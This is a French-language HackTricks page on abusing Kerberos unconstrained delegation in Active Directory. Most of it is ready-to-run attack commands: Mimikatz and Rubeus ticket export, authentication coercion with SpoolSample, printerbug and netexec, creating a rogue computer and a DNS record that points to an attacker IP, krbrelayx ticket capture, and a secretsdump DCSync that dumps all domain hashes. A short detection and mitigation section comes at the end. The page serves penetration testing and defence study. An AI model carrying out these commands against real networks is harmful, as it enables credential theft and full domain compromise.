# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Il s’agit d’une fonctionnalité qu’un **Domain Administrator** peut configurer sur n’importe quel **Computer** du domaine. Ensuite, chaque fois qu’un **user se connecte** au Computer, une **copie du TGT** de cet utilisateur est **envoyée dans le TGS** fourni par le DC, puis **sauvegardée en mémoire dans LSASS**. Ainsi, si vous disposez de privilèges Administrator sur la machine, vous pourrez **dump les tickets et usurper l’identité des utilisateurs** sur n’importe quelle machine.

Par conséquent, si un domain admin se connecte à un Computer sur lequel la fonctionnalité « Unconstrained Delegation » est activée et que vous disposez de privilèges d’administrateur local sur cette machine, vous pourrez dump le ticket et usurper l’identité du Domain Admin n’importe où (domain privesc).

Vous pouvez **rechercher les objets Computer possédant cet attribut** en vérifiant si l’attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contient [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Vous pouvez effectuer cette recherche avec le filtre LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, utilisé par powerview :
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Charger le ticket de l’Administrator (ou de l’utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Plus d’informations : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Plus d’informations sur Unconstrained delegation sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Forcer l’authentification**

Si un attaquant parvient à **compromettre un ordinateur autorisé pour "Unconstrained Delegation"**, il pourrait **piéger** un **serveur d’impression** afin qu’il **s’y connecte automatiquement**, **en sauvegardant un TGT** dans la mémoire du serveur.\
L’attaquant pourrait alors effectuer une **attaque Pass the Ticket pour usurper l’identité** du compte ordinateur du serveur d’impression.

Pour faire en sorte qu’un serveur d’impression se connecte à une machine quelconque, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample) :
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si le TGT provient d'un contrôleur de domaine, vous pouvez effectuer une [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) et obtenir tous les hashes du DC.\
[**Plus d'informations sur cette attaque dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Découvrez ici d'autres moyens de **forcer une authentification:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Tout autre coercion primitive qui force la victime à s'authentifier avec **Kerberos** auprès de votre hôte avec unconstrained-delegation fonctionne également. Dans les environnements modernes, cela signifie souvent remplacer le flux classique de PrinterBug par **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ou une coercion basée sur **WebClient/WebDAV**, selon la surface RPC accessible.

### Abuser d'un compte utilisateur/service avec unconstrained delegation

Unconstrained delegation n'est **pas limité aux objets ordinateur**. Un **compte utilisateur/service** peut également être configuré avec `TRUSTED_FOR_DELEGATION`. Dans ce scénario, l'exigence pratique est que le compte reçoive des tickets de service Kerberos pour un **SPN qu'il possède**.

Cela mène à 2 chemins offensifs très courants :

1. Vous compromettez le mot de passe/hash du **compte utilisateur** avec unconstrained-delegation, puis vous **ajoutez un SPN** à ce même compte.
2. Le compte possède déjà un ou plusieurs SPN, mais l'un d'eux pointe vers un **hostname obsolète ou décommissionné** ; recréer l'**enregistrement DNS A** manquant suffit à détourner le flux d'authentification sans modifier l'ensemble des SPN.<sup>[[8]](#references)</sup>

Flux Linux minimal :
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes :

- Ceci est particulièrement utile lorsque le principal unconstrained est un **service account** et que vous disposez uniquement de ses identifiants, sans exécution de code sur un hôte joint au domaine.
- Si l’utilisateur ciblé possède déjà un **SPN obsolète**, recréer l’**enregistrement DNS** correspondant peut être moins bruyant que d’écrire un nouveau SPN dans AD.
- Les techniques récentes centrées sur Linux utilisent `addspn.py`, `dnstool.py`, `krbrelayx.py` et un primitive de coercition ; vous n’avez pas besoin d’interagir avec un hôte Windows pour terminer la chaîne.

### Abusing Unconstrained Delegation with an attacker-created computer

Les domaines modernes ont souvent `MachineAccountQuota > 0` (10 par défaut), ce qui permet à tout principal authentifié de créer jusqu’à N objets ordinateur. Si vous disposez également du token privilege `SeEnableDelegationPrivilege` (ou de droits équivalents), vous pouvez définir le nouvel ordinateur comme approuvé pour l’unconstrained delegation et récupérer les TGT entrants provenant de systèmes privilégiés.<sup>[[1]](#references)</sup>

Flux général :

1) Créer un ordinateur que vous contrôlez
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Rendre le faux nom d’hôte résolvable au sein du domaine
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Activer Unconstrained Delegation sur l’ordinateur contrôlé par l’attaquant
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Pourquoi cela fonctionne : avec unconstrained delegation, le LSA d’un ordinateur configuré pour la délégation met en cache les TGT entrants. Si vous incitez un DC ou un serveur privilégié à s’authentifier auprès de votre fake host, son TGT machine sera stocké et pourra être exporté.

4) Démarrez krbrelayx en mode export et préparez le matériel Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Forcer l’authentification du DC/des serveurs vers votre hôte factice
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx enregistrera des fichiers ccache lorsqu’une machine s’authentifie, par exemple :
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Utiliser le TGT de la machine DC capturé pour effectuer un DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` permet la création de computers sans privilèges élevés ; sinon, des droits explicites sont nécessaires.
- La définition de `TRUSTED_FOR_DELEGATION` sur un computer nécessite `SeEnableDelegationPrivilege` (ou des privilèges d’administrateur de domaine).
- Assurez la résolution du nom vers votre fake host (enregistrement DNS A) afin que le DC puisse l’atteindre via son FQDN.
- La coercion nécessite un vecteur viable (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Désactivez-les sur les DCs si possible.
- Si le compte victime est marqué **« Account is sensitive and cannot be delegated »** ou s’il est membre de **Protected Users**, le TGT transféré ne sera pas inclus dans le service ticket ; cette chaîne ne permettra donc pas d’obtenir un TGT réutilisable.<sup>[[9]](#references)</sup>
- Si **Credential Guard** est activé sur le client/serveur qui s’authentifie, Windows bloque **Kerberos unconstrained delegation**, ce qui peut faire échouer, du point de vue de l’opérateur, des chemins de coercion pourtant valides.

Idées de détection et de hardening :

- Déclenchez une alerte sur les Event IDs 4741 (computer account créé) et 4742/4738 (computer/user account modifié) lorsque l’UAC `TRUSTED_FOR_DELEGATION` est défini.
- Surveillez les ajouts inhabituels d’enregistrements DNS A dans la zone du domaine.
- Surveillez les pics d’événements 4768/4769 provenant d’hôtes inattendus ainsi que les authentifications de DCs vers des hôtes qui ne sont pas des DCs.
- Limitez `SeEnableDelegationPrivilege` à un ensemble minimal de comptes, définissez `MachineAccountQuota=0` lorsque cela est possible et désactivez Print Spooler sur les DCs. Imposer la signature LDAP et le channel binding.

### Mitigation

- Limitez les connexions DA/Admin à des services spécifiques.
- Définissez **« Account is sensitive and cannot be delegated »** pour les comptes privilégiés.

## Références

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Compromission du domaine via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation dans Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Groupe de sécurité Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Compromission du domaine via un print server DC et la délégation Kerberos](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
